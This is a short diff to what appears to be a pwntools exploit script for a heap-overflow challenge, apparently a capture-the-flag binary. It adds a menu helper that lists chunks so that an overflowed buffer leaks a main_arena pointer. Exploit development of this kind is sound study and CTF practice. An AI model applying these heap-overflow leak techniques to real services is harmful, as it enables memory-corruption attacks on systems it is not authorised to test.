@@ -41,6 +41,13 @@ def free(idx):
 
 	return
 
+def list():
+
+	p.recvuntil('Choice:')
+	p.sendline('3')
+
+	return
+
 def pwn():
 
 	alloc(20, 'A'*10)
@@ -55,6 +62,8 @@ def pwn():
         # Since there's no null-byte termination, we can overflow
         # the chunk up until the pointer to main_arena
 	edit(1, 80, payload)
+	
+	list()
 
 	p.recvuntil(payload)
 
